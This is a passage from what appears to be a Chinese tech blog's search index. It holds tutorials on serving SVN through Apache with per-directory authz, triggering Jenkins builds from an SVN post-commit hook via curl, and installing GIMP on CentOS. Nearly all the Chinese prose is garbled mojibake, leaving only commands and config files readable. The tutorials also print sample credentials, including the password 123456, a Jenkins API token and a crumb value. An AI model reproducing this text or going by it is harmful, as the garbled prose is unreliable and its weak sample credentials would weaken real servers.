‡ç­¾å†…çš„å€¼ï¼Œè€Œjenkins-repoæ˜¯ä¸Šé¢åˆ›å»ºçš„SVNä»“åº“ï¼Œå›è½¦ä¹‹åä¼šæç¤ºä½ è¾“å…¥å¯†ç $ svn checkout --username jenkins http://127.0.0.1/svn/jenkins-repo/# è¿›å…¥åˆšæ£€å‡ºçš„ä»“åº“ç›®å½•$ cd jenkins-repo# åˆ›å»ºæ–‡ä»¶$ touch api.version# å°†æŒ‡å®šæ–‡ä»¶çº³å…¥SVNç‰ˆæœ¬æ§åˆ¶$ svn add api.version# å°†æŒ‡å®šæ–‡ä»¶æäº¤åˆ°SVNä»“åº“$ svn commit -m "add file" api.version# æ˜¾ç¤ºå·¥ä½œåŒºä¸­ç›®å½•ä¸æ–‡ä»¶çš„çŠ¶æ€ï¼Œå¦‚æœä¸Šè¿°æ­¥éª¤éƒ½æˆåŠŸæ‰§è¡Œï¼Œæ‰§è¡Œè¯¥å‘½ä»¤ååˆ™ä¸ä¼šæœ‰ä»»ä½•æ—¥å¿—ä¿¡æ¯è¾“å‡º$ svn status# å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥è¯¢svnå‘½ä»¤å…·ä½“çš„ä½¿ç”¨æ–¹æ³•$ svn --help$ svn commit --help# è‡³æ­¤ï¼Œé€šè¿‡Apacheã€Subversionæ­å»ºSVNæœåŠ¡å™¨ï¼ˆHTTPï¼‰çš„æ­¥éª¤ç®—æ˜¯åŸºæœ¬å®Œæˆäº†ï¼Œä¸‹é¢å°†ä»‹ç»ä½¿ç”¨Apacheçš„mod_authz_svnæ¨¡å—å¯¹ä»“åº“ç›®å½•è¿›è¡Œæ›´ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ï¼Œå¦‚æœä¸éœ€è¦ç»†ç²’åº¦çš„æƒé™æ§åˆ¶ï¼Œåˆ™ä¸ç”¨ç»§ç»­å¾€ä¸‹é˜…è¯»äº†ã€‚ é€šè¿‡ mod_authz_svn æ¨¡å—å¯¹ä»“åº“ç›®å½•çš„è®¿é—®è¿›è¡Œç»†ç²’åº¦æƒé™æ§åˆ¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# è¿›å…¥å¯¹åº”SVNä»“åº“çš„ç›®å½•# cd /var/lib/svn/jenkins-repo# æ¯ä¸ªSVNä»“åº“ç›®å½•ä¸‹éƒ½æœ‰å¯¹åº”çš„èº«ä»½æ ¡éªŒæ–‡ä»¶ï¼ˆauthzã€passwdï¼‰ï¼Œç”±SVNè‡ªåŠ¨åˆ›å»º# tree confconf|-- authz|-- hooks-env.tmpl|-- passwd`-- svnserve.conf# æ·»åŠ SVNä»“åº“çš„ç”¨æˆ·å¸å·ï¼Œæ³¨æ„è¿™é‡Œçš„ç”¨æˆ·å/å¯†ç ï¼Œéœ€è¦å’Œè®¿é—®Apacheçš„ç”¨æˆ·å/å¯†ç ä¸€è‡´# å³ç”¨æˆ·å/å¯†ç éœ€è¦å’Œ"AuthUserFile /etc/apache2/dav_svn.passwd"æŒ‡å®šçš„å¸å·ä¿¡æ¯ä¸€è‡´# vim conf/passwd[users]jenkins = 123456# é…ç½®SVNä»“åº“çš„ç”¨æˆ·ç»„ã€è¯»å†™æƒé™# vim conf/authz[groups]team = jenkins[/]@team = rw# ç¼–è¾‘SVNä»“åº“çš„é…ç½®æ–‡ä»¶ï¼Œå¯¹åº”å†…å®¹ä¿®æ”¹å¦‚ä¸‹ï¼Œå…¶ä¸­â€œanon-accessâ€é¡¹çš„å€¼å¿…é¡»ä¸ºnone# vim conf/svnserve.conf[general]anon-access = noneauth-access = writepassword-db = passwdauthz-db = authz# é…ç½®authzåŠŸèƒ½ï¼Œå…¶ä¸­AuthzSVNAccessFileæŒ‡å‘çš„æ˜¯SVNä»“åº“çš„authzç­–ç•¥æ–‡ä»¶ï¼Œå¤šä¸ªSVNä»“åº“å¯ä»¥ä½¿ç”¨å¤šä¸ª&lt;Location&gt;æ ‡ç­¾è¿›è¡Œé…ç½®ï¼Œæ³¨æ„è¿™é‡Œä½¿ç”¨çš„æ˜¯â€œSVNPathâ€ï¼Œè€Œä¸æ˜¯"SVNParentPath"# vim /etc/apache2/mods-enabled/dav_svn.conf&lt;Location /svn/jenkins-repo&gt; DAV svn SVNPath /var/lib/svn/jenkins-repo AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/jenkins_repo.passwd AuthzSVNAccessFile /var/lib/svn/jenkins-repo/conf/authz Require valid-user&lt;/Location&gt;# å¦‚æœä½¿ç”¨â€SVNParentPathâ€œä»£æ›¿â€SVNPathâ€œæ¥æŒ‡å®šå¤šä¸ªä»“åº“çš„çˆ¶ç›®å½•æ—¶ï¼Œé‚£ä¹ˆæ‰€æœ‰ä»“åº“éƒ½å°†æŒ‰ç…§æŒ‡å®šçš„ç­–ç•¥æ–‡ä»¶æ¥ç®¡ç†è¯»å†™æƒé™ï¼›æ­¤æ—¶å¦‚æœè¦å¯¹å…·ä½“æ¯ä¸ªä»“åº“åˆ†åˆ«é…ç½®ä¸åŒè¯»å†™æƒé™ï¼Œauthzæ–‡ä»¶å†…éœ€è¦ä½¿ç”¨å¦‚ä¸‹çš„è¯­æ³•è¿›è¡Œé…ç½®ï¼š&lt;Location /svn&gt; DAV svn SVNParentPath /var/lib/svn AuthType Basic AuthName "Subversion Repository" AuthUserFile /etc/apache2/dav_svn.passwd AuthzSVNAccessFile /etc/svn/svn_authz Require valid-user&lt;/Location&gt;# vim /etc/svn/svn_authz[groups]project1_committers = paulex richardproject2_committers = jimmy michel[repos1:/]@ project1_committer = rw[repos2:/]@ project2_committer = rw# é‡å¯apacheæœåŠ¡# service apache2 restart å¯åŠ¨ Subversion æœåŠ¡ 1234567891011121314151617181920# é»˜è®¤æƒ…å†µä¸‹ï¼Œé€šè¿‡Apacheã€Subversionæ­å»ºSVNæœåŠ¡å™¨ï¼Œå¦‚æœåªéœ€è¦é€šè¿‡HTTPåè®®è®¿é—®SVNä»“åº“ï¼Œåˆ™æ— éœ€å¯åŠ¨SubversionæœåŠ¡ï¼Œç›¸åå¦‚æœæƒ³é€šè¿‡SVNåè®®ç›´æ¥è®¿é—®SVNä»“åº“åˆ™éœ€è¦å¯åŠ¨# å…¶ä¸­/var/lib/svnæ˜¯æ‰€æœ‰SVNä»“åº“çš„çˆ¶ç›®å½•ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨SVNåè®®ï¼Œé‚£ä¹ˆSVNä»“åº“çš„ç”¨æˆ·ç™»å½•ä¸è¯»å†™æƒé™æ§åˆ¶é»˜è®¤æ˜¯é€šè¿‡æ¯ä¸ªä»“åº“ä¸‹çš„passwdã€authzã€svnserve.confé…ç½®æ–‡ä»¶åˆ†åˆ«è¿›è¡Œæ§åˆ¶ï¼Œæ­¤æ—¶ä¸Apacheæ²¡æœ‰ä»»ä½•å…³ç³»# å‚æ•° -d è¡¨ç¤ºåå°è¿è¡Œï¼Œå¦åˆ™é»˜è®¤å‰å°è¿è¡Œ# svnserve -d -r /var/lib/svn# æµ‹è¯•SVNå®¢æˆ·ç«¯ä½¿ç”¨SVNåè®®æ£€å‡ºä»“åº“jenkins-repoï¼ŒæŒ‡å®šä½¿ç”¨jenkinsç”¨æˆ·è¿›è¡Œç™»å½•ï¼Œå…¶ä¸­3690æ˜¯SubversionæœåŠ¡çš„é»˜è®¤ç«¯å£# svn checkout --username jenkins svn://127.0.0.1:3690/jenkins-repo# æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€# ufw status# å¦‚æœå¼€å¯äº†é˜²ç«å¢™ï¼Œåˆ™å¼€æ”¾3690ç«¯å£# ufw allow 3690/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# ufw reload# å…³äºSubversionæœåŠ¡å¼€æœºè‡ªå¯åŠ¨çš„ä¸¤ç§æ–¹å¼ï¼š# æ–¹å¼ä¸€ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·Supervistorå®ç°Subversionå¼€æœºè‡ªå¯åŠ¨# æ–¹å¼äºŒï¼šå°†é…ç½®Subversioné…ç½®æˆç³»ç»ŸæœåŠ¡ï¼Œç”±systemctlç®¡ç†å¼€æœºè‡ªå¯åŠ¨ Dockerfile é‡Œé…ç½®å®¹å™¨å¯åŠ¨æ—¶é»˜è®¤å¯åŠ¨ Apache ä¸ Subversion 1234567RUN echo "svnserve -d -r /var/lib/svn" &gt; /usr/local/start-servers.shRUN echo "apachectl -D FOREGROUND" &gt;&gt; /usr/local/start-servers.shRUN chmod +x /usr/local/start-servers.shCMD /bin/bash /usr/local/start-servers.sh# ä»¥ååˆ›å»ºå¹¶ä»¥åå°æ–¹å¼å¯åŠ¨å®¹å™¨æ—¶ï¼ŒApacheä¸SubversionæœåŠ¡ä¼šé»˜è®¤è‡ªå¯åŠ¨# docker run -d -p 9126:80 -p 4690:3690 ... Centos7 å®‰è£… Apache&amp;Subversion How to Setup an Apache Subversion (SVN) Server on CentOS 7 The Ultimate Guide to Setting Up Apache Subversion SVN and TortoiseSVN For Version Control æœ¬æ–‡å¼•ç”¨ Install Apache SVN (Subversion) on Debian 9 / Ubuntu 16.04 ä½¿ç”¨ Apache å’Œ Subversion æ­å»ºå®‰å…¨çš„ç‰ˆæœ¬æ§åˆ¶ç¯å¢ƒï¼ˆHttpã€Httpsã€MySQL å­˜å‚¨ Apache ç”¨æˆ·ä¿¡æ¯ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"debian"},{title:"Jenkins å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ Jenkins ä¸ SVN æŒç»­é›†æˆå®æˆ˜",url:"/posts/bd0f3a17.html",text:'ä¸Šç¯‡ï¼šJenkins å…¥é—¨æ•™ç¨‹ä¹‹äºŒ Jenkins ä¸ SVN æ­å»º CI-CD ç¯å¢ƒ ä¸‹é¢çš„å®æˆ˜å†…å®¹æ˜¯åœ¨ä¸Šç¯‡å†…å®¹çš„åŸºç¡€ä¸Šè¿›è¡Œæ“ä½œçš„ï¼Œä¸ºäº†ä¿è¯è¿è´¯æ€§ï¼Œå»ºè®®å…ˆå°†ä¸Šç¯‡çš„æ“ä½œæ­¥éª¤æ‰§è¡Œå®Œå†é˜…è¯»æœ¬ç¯‡å†…å®¹ã€‚ é€šè¿‡ Eclipse åˆ›å»ºåŸºäº Maven çš„ SpringBoot Web é¡¹ç›®ï¼Œç”¨äºæµ‹è¯• Maven æ„å»ºé¡¹ç›® åˆ›å»º Maven é¡¹ç›®çš„æ—¶å€™ï¼ŒArchetype é€‰æ‹©â€maven-archetype-quickstartâ€ï¼Œæ­¤ SpringBoot Web é¡¹ç›®ä¸éœ€è¦ web.xmlï¼Œåªéœ€åœ¨ pom.xml é…ç½®æ–‡ä»¶é‡ŒæŒ‡å®š packaging ä¸º war ç±»å‹å³å¯ã€‚é¡¹ç›®å†…å®¹å¾ˆç®€å•ï¼Œè®¿é—® JSP é¡µé¢ç›´æ¥è¾“å‡ºå­—ç¬¦ä¸² â€œhello Jimâ€ã€‚é¡¹ç›®æºç ä¸‹è½½é“¾æ¥å·²ç»ç»™å‡ºï¼Œä¸‹è½½è§£å‹åç›´æ¥å¯¼å…¥é¡¹ç›®åˆ° Eclipseï¼Œæ‰§è¡Œâ€spring-boot:runâ€ å‘½ä»¤å³å¯è¿è¡Œé¡¹ç›®ï¼Œæµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€éªŒè¯æ˜¯å¦è¿è¡Œæ­£å¸¸ï¼šhttp://127.0.0.1:8080/demo/helloï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ä»£ç  ã€ç‚¹å‡»ä¸‹è½½ SHA256 æ ¡éªŒæ–‡ä»¶ã€‚ åœ¨ Eclipse é‡Œåˆ›å»º SVN èµ„æºåº“ï¼Œå¹¶å°† SpringBoot Web é¡¹ç›®çš„æºç æäº¤ SVN èµ„æºåº“ è¿™é‡Œçš„ SVN èµ„æºåº“æ˜¯ä¸Šä¸€ç¯‡æ•™ç¨‹é‡Œåˆ›å»ºçš„ Subversion ä»“åº“ jenkins-repoï¼Œè®¿é—®çš„ç”¨æˆ·åæ˜¯ jenkinsï¼Œå¯†ç æ˜¯ 123456ï¼›å› ä¸ºå®¿ä¸»æœºä¸ Docker å®¹å™¨ï¼ˆSVNï¼‰é…ç½®äº†ç«¯å£æ˜ å°„ï¼Œå› æ­¤ Eclipse é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹ URL è®¿é—®å¯¹åº”çš„ SVN ä»“åº“ï¼š http://127.0.0.1:9126/svn/jenkins-repo å°† jenkins-study é¡¹ç›®çš„æºç æäº¤åˆ° SVN èµ„æºåº“åçš„ç›®å½•ç»“æ„ Jenkins åˆ›å»ºä»»åŠ¡ é€‰æ‹© â€œæ„å»ºè‡ªæœ‰é£æ ¼çš„è½¯ä»¶é¡¹ç›®â€ æ‰¾åˆ° â€œSource Code Managementâ€ï¼Œé€‰æ‹© â€œSubversionâ€ï¼Œç‚¹å‡»â€Addâ€ æŒ‰é’®ï¼Œæ·»åŠ è®¿é—® SVN ä»“åº“ jenkins-repo çš„ç”¨æˆ·åå’Œå¯†ç  åœ¨ â€œSource Code Managementâ€ ä¸­ç»§ç»­å¡«å†™ jenkins-study é¡¹ç›®æ‰€åœ¨ SVN ä»“åº“ jenkins-repo å®Œæ•´çš„ URL åœ°å€ï¼Œé€‰æ‹©ä¸Šé¢æ·»åŠ çš„ SVN ä»“åº“ç”¨æˆ·åå’Œå¯†ç ï¼›æ„å»ºç±»å‹é€‰æ‹© â€œInvoke top-level Maven targetsâ€ï¼Œè€Œ Maven ç‰ˆæœ¬åˆ™é€‰æ‹©ä¹‹å‰åœ¨ â€œå…¨å±€å·¥å…·é…ç½®â€ ä¸­æŒ‡å®šçš„ Maven ç‰ˆæœ¬ï¼Œæ„å»ºå‘½ä»¤å¡« â€œclean installâ€ï¼Œæœ€åä¿å­˜è®¾ç½®å†…å®¹ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œå¦‚æœè¿™é‡Œçš„ URL åœ°å€ä½¿ç”¨ SVN åè®®ï¼Œé‚£ Jenkins å°†ä¼šæç¤ºæ— æ•ˆ URL çš„é”™è¯¯ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ HTTP åè®®æ¥è®¿é—® SVN ä»“åº“ï¼ŒåŒæ—¶å®Œæ•´çš„ URL åœ°å€å¿…é¡»åŒ…å« Maven é¡¹ç›®çš„åç§°ï¼Œå› ä¸º Jenkins é»˜è®¤ä¼šå»æ‰¾ URL åœ°å€ä¸‹çš„ pom.xml æ–‡ä»¶ã€‚ä½¿ç”¨ HTTP åè®®è®¿é—®çš„å‰ææ˜¯ Subversion é›†æˆäº† Web æœåŠ¡ï¼Œå…·ä½“æ•™ç¨‹åœ¨è¿™é‡Œï¼Œé€šè¿‡ Apacheã€Subversion æ­å»º SVN æœåŠ¡å™¨ï¼Œå®ç°ä½¿ç”¨ HTTP/SVN åè®®è®¿é—® SVN ä»“åº“ 12345678# å› ä¸ºSVNæœåŠ¡å®‰è£…åœ¨Dockerå®¹å™¨å†…ï¼ˆåŸºäºDebiané•œåƒï¼‰ï¼ŒJenkinsåŒæ ·ä¹Ÿå®‰è£…åœ¨Dockerå®¹å™¨å†…ï¼ˆåŸºäºTomcaté•œåƒï¼‰ï¼Œå› æ­¤ä¸‹å›¾URLä¸­çš„IPæ˜¯SVNæœåŠ¡æ‰€åœ¨Dockerå®¹å™¨çš„IPã€‚å› ä¸ºä¹‹å‰åœ¨Dockerå®¹å™¨å†…å®‰è£…Subversionå¹¶é›†æˆäº†Apacheï¼Œè€ŒApacheé»˜è®¤ç«¯å£æ˜¯80ï¼Œæ‰€ä»¥ä¸‹å›¾çš„URLåœ°å€å¯ä»¥ä¸æŒ‡å®šå…·ä½“çš„ç«¯å£ã€‚# è·å–SVNæœåŠ¡æ‰€åœ¨Dockerå®¹å™¨çš„IPåœ°å€# docker exec -it svn-httpd ip addr111: eth0@if112: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever æ‰‹åŠ¨å¯¹ä¹‹å‰çš„ jenkins-study é¡¹ç›®æ‰§è¡Œæ„å»ºæ“ä½œ æ„å»ºè¿‡ç¨‹ä¸­ï¼ŒJenkins é»˜è®¤ä¼šä» SVN ä»“åº“æ£€å‡ºå¯¹åº”çš„é¡¹ç›®æºç åˆ° ï½/.jenkins/workspace ç›®å½•ï¼ˆJenkins æ‰€åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ç›®å½•ï¼‰ï¼ŒåŒæ—¶åœ¨ Jenkins æ„å»ºä»»åŠ¡é¡µé¢å·¦è¾¹çš„å°çª—å£å†…å¯ä»¥çœ‹åˆ°ç›¸å…³æ„å»ºä¿¡æ¯ï¼ˆæ„å»ºè¿›åº¦ã€æ—¥å¿—ç­‰ï¼‰ã€‚ç¬¬ä¸€æ¬¡æ„å»ºè¿‡ç¨‹è€—æ—¶ä¼šæ¯”è¾ƒé•¿ï¼Œå› ä¸º Maven éœ€è¦ä»ä¸­å¤®ä»“åº“ä¸‹è½½å¾ˆå¤šä¾èµ–åŒ…ï¼›å¦‚æœæƒ³åŠ å¿«æ„å»ºé€Ÿåº¦ï¼Œå±€åŸŸç½‘å†…å¯ä»¥é€šè¿‡ Nexus æ­å»º Maven æœ¬åœ°ä»“åº“ï¼Œç„¶ååœ¨ Maven çš„é…ç½®æ–‡ä»¶ settings.xml ä¸­æ·»åŠ æœ¬åœ°ä»“åº“çš„åœ°å€ã€‚ é…ç½®æ„å»ºå®Œæˆåå°† War åŒ…éƒ¨ç½²åˆ° Tomcat åº”ç”¨æœåŠ¡å™¨ è¿™é‡Œçš„ Tomcat åº”ç”¨æœåŠ¡å™¨ï¼Œä¸€èˆ¬æŒ‡æµ‹è¯•æœåŠ¡å™¨æˆ–è€…ç”Ÿäº§æœåŠ¡å™¨ã€‚ç”±äº Jenkins éœ€è¦å°† War éƒ¨ç½²åˆ° Tomcat æœåŠ¡å™¨ä¸Šï¼Œå› æ­¤è¿™é‡Œçš„ Tomcat æœåŠ¡å™¨éœ€è¦é¢„å…ˆéœ€è¦é…ç½®ç®¡ç†å‘˜ç”¨æˆ·ã€‚å…ˆæ‰¾åˆ°â€Post-build Actionsâ€ é…ç½®é¡¹ï¼Œé€‰æ‹©â€Add post-build actionâ€ â€“&gt; â€œDeploy war/ear to a containerï¼ˆä¾èµ– deploy to container æ’ä»¶ï¼‰â€ï¼Œç„¶åå¡«å†™ War åŒ…æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ã€è®¿é—® Tomcat é¡¹ç›®æ—¶ä½¿ç”¨çš„é¡¹ç›®åç§°ã€‚æ¥ç€é€‰æ‹©â€Add Containerâ€ â€“&gt; â€œTomcat 8.xâ€ï¼Œç‚¹å‡» â€œAddâ€ æŒ‰é’®ï¼Œå¡«å†™ Tomcat æœåŠ¡å™¨ç®¡ç†å‘˜ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€è®¿é—® Tomcat æœåŠ¡å™¨çš„ URL åœ°å€ï¼Œç„¶åç‚¹å‡» â€œSaveâ€ æŒ‰é’®ä¿å­˜è®¾ç½®ã€‚æœ€åå†æ¬¡æ‰§è¡Œæ„å»ºæ“ä½œï¼Œæ„å»ºå®Œæˆåå¯ä»¥æŸ¥çœ‹æ„å»ºæ—¥å¿—æˆ–è€…åœ¨æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€ï¼ŒéªŒè¯æ„å»ºç”Ÿæˆçš„ War åŒ…æ–‡ä»¶æ˜¯å¦æˆåŠŸéƒ¨ç½²åˆ°æŒ‡å®šçš„ Tomcat æœåŠ¡å™¨ä¸Šï¼Œæµè§ˆå™¨å¯ä»¥è®¿é—® URLï¼šhttp://127.0.0.1:8082/jenkins-study/demo/hello (adsbygoogle = window.adsbygoogle || []).push({}); é…ç½®è¿œç¨‹è§¦å‘æ„å»º æ‰¾åˆ°â€Build Triggersâ€ é…ç½®é¡¹ï¼Œå‹¾é€‰â€Trigger builds remotelyâ€ï¼Œå¡«å†™ Token çš„å€¼ï¼ˆä»»æ„å­—ç¬¦ä¸²ï¼‰ï¼Œæœ€åç‚¹å‡»â€Saveâ€ æŒ‰é’®ä¿å­˜è®¾ç½®ã€‚é€šè¿‡æµè§ˆå™¨æˆ–è€… CURL å·¥å…·è®¿é—®é“¾æ¥ http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt ï¼Œæµ‹è¯•è¿œç¨‹è§¦å‘æ„å»ºæ˜¯å¦é…ç½®æˆåŠŸï¼›å…¶ä¸­ http://127.0.0.1:8888/jenkines æ˜¯è®¿é—® Jenkins æœåŠ¡å™¨çš„ URL åœ°å€ã€‚æ„å»ºæˆåŠŸåï¼Œåœ¨ Jenkins æ„å»ºä»»åŠ¡é¡µé¢å·¦è¾¹çš„å°çª—å£ï¼ˆæ„å»ºå†å²ï¼‰å†…å¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºçš„æ„å»ºå†å²ã€‚ è·å–ç”¨æˆ·çš„ crumb å€¼ï¼Œä½¿ç”¨ CURL å‘½ä»¤è§¦å‘è¿œç¨‹æ„å»ºæ—¶éœ€è¦ç”¨åˆ° ä¸€èˆ¬æ¥è¯´ï¼Œå½“åœ¨ Jenkins å†…å¯ç”¨äº†â€ é˜²æ­¢è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ â€ï¼Œä¸”é€šè¿‡ CURL å‘½ä»¤è§¦å‘è¿œç¨‹æ„å»ºæ—¶æ‰éœ€è¦å¸¦ä¸Š crumb å€¼ã€‚ä¸‹é¢å…ˆä»‹ç»å¦‚ä½•è·å–æŸç”¨æˆ·çš„ API Tokenï¼Œå› ä¸ºåç»­å°†ç”¨åˆ° API Token çš„å€¼ã€‚ 1234567891011# æµè§ˆå™¨è¾“å…¥ä»¥ä¸‹åœ°å€è·å–æŸç”¨æˆ·çš„crumbå€¼ï¼Œå…¶ä¸­clayæ˜¯ç”¨æˆ·åï¼Œ115613e7bde4a846d49800f9e004cda2e4æ˜¯ä¸Šé¢è·å–å¾—åˆ°çš„API Tokenhttp://clay:115613e7bde4a846d49800f9e004cda2e4@127.0.0.1:8888/jenkins/crumbIssuer/api/xml# è¿”å›ç»“æœä¸ºæŸç”¨æˆ·çš„crumbå€¼&lt;defaultCrumbIssuer _class="hudson.security.csrf.DefaultCrumbIssuer"&gt; &lt;crumb&gt;a2088f0de8aca0d5a05079eed6ea972a&lt;/crumb&gt; &lt;crumbRequestField&gt;Jenkins-Crumb&lt;/crumbRequestField&gt;&lt;/defaultCrumbIssuer&gt;# ä»¥åè§¦å‘Jenkinè¿œç¨‹æ„å»ºæ—¶éœ€è¦æºå¸¦çš„è¯·æ±‚æ¶ˆæ¯å¤´ä¸ºä»¥ä¸‹å€¼Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a é€šè¿‡ CURL å‘½ä»¤è§¦å‘è¿œç¨‹æ„å»º 1234567# é¦–å…ˆæŒ‰ç…§ä¸Šé¢çš„æ“ä½œï¼Œé…ç½®è¿œç¨‹è§¦å‘æ„å»ºï¼Œå¹¶è·å–æŸç”¨æˆ·çš„crumbå€¼# å‘½ä»¤çš„æ ¼å¼# curl -X post -v -u [Jenkins ç”¨æˆ·å]:[Jenkins å¯†ç ] -H "è¯·æ±‚æ¶ˆæ¯å¤´ä¿¡æ¯" http://[Jenkins æœåŠ¡å™¨IPåœ°å€]:[Jenkins æœåŠ¡å™¨ç«¯å£å·]/jenkins/job/[Jenkins é¡¹ç›®åç§°]/build?token=[API Token]# å®Œæ•´çš„CURLå‘½ä»¤ï¼Œæ„å»ºæˆåŠŸååœ¨Jenkinsæ„å»ºä»»åŠ¡å·¦è¾¹çš„å°çª—å£ï¼ˆæ„å»ºå†å²ï¼‰å†…å¯ä»¥çœ‹åˆ°æ–°åˆ›å»ºçš„æ„å»ºå†å²# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt é…ç½® SVN é’©å­ç¨‹åº 12345678910111213# è¿æ¥Dockerå®¹å™¨ï¼ˆSVNï¼‰# docker exec -it jenkins-svn-httpd /bin/bash# è¿›å…¥SVNä»“åº“jenkins-repoçš„hooksç›®å½•ï¼Œå¹¶åˆ›å»ºé’©å­ç¨‹åºï¼ˆä¸å¸¦.tmplåç¼€ï¼‰,ç„¶åèµ‹äºˆå¯æ‰§è¡Œçš„æƒé™# cd /var/lib/svn/jenkins-repo/hooks# cp post-commit.tmpl post-commit# chmod 755 post-commit# ç¼–è¾‘post-commitæ–‡ä»¶ï¼Œå°†æ–‡ä»¶åŸæœ‰çš„å†…å®¹éƒ½æ³¨é‡Šæ‰ï¼Œç„¶ååœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ CURLå‘½ä»¤# æ³¨æ„ï¼Œç”±äºSVNä¸JenkinsæœåŠ¡éƒ½éƒ¨ç½²åœ¨Dockerå®¹å™¨å†…ï¼Œå› æ­¤è¿™é‡ŒCURLå‘½ä»¤ä¸­çš„æœåŠ¡å™¨IPä¸èƒ½æ˜¯127.0.0.1ï¼Œå¿…é¡»æ˜¯JenkinsæœåŠ¡æ‰€åœ¨Dockerå®¹å™¨çš„IP# vim post-commit# "$REPOS"/hooks/mailer.py commit "$REPOS" $REV "$REPOS"/mailer.conf# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt éªŒè¯ SVN é’©å­ç¨‹åºæ˜¯å¦ç”Ÿæ•ˆ Eclipse å†…ä¿®æ”¹ Maven é¡¹ç›® jenkins-study çš„ä»£ç ï¼Œç„¶åå°†ä»£ç æäº¤åˆ° SVN ä»“åº“ï¼Œè§‚å¯Ÿ Jenkins æ„å»ºä»»åŠ¡é¡µé¢å·¦è¾¹çš„å°çª—å£ï¼ˆæ„å»ºå†å²ï¼‰å†…æ˜¯å¦æœ‰æ–°æ„å»ºå†å²å‡ºç°ï¼Œå¦‚æœæœ‰åˆ™è¯´æ˜ SVN é’©å­ç¨‹åºç”Ÿæ•ˆäº†ã€‚ Jenkins å¸¸è§„æ„å»ºæµç¨‹æ€»ç»“ ä¸‹ç¯‡ï¼šJenkins å…¥é—¨æ•™ç¨‹ä¹‹å›› Jenkins ä¸ Git æŒç»­é›†æˆå®æˆ˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Centos7 å®‰è£…å›¾ç‰‡å¤„ç†è½¯ä»¶ GIMP",url:"/posts/3cf5ae19.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux GIMP å®‰è£… GIMP ç®—å¾—ä¸Šæ˜¯ Linux ç³»ç»Ÿä¸‹çš„ Photoshopï¼ŒåŸºäº GTK ç¼–å†™çš„å›¾åƒç¼–è¾‘å¤„ç†è½¯ä»¶ï¼ŒåŠŸèƒ½éå¸¸å¼ºå¤§ã€‚ 1234567891011121314# å®‰è£…EPELæº# yum install epel-release# æŸ¥çœ‹æº# ls /etc/yum.repos.d/# æ›´æ–°æº# yum clean all &amp;&amp; yum makecache# å®‰è£…åŸºç¡€ä¾èµ–åŒ…# yum install aalib aalib-devel libexif-devel libjpeg-devel libpng-devel# å®‰è£…GIMP# yum install gimp mtPaint å®‰è£… mtPaint æ˜¯ Linux ä¸‹çš„ä¸€æ¬¾ä¼˜ç§€çš„ç”»å›¾è½¯ä»¶ï¼Œæ¨èå®‰è£…ä½¿ç”¨ã€‚ 1# yum install mtpaint Shutter å®‰è£… Shutter æ˜¯ä¸€æ¬¾ Linux 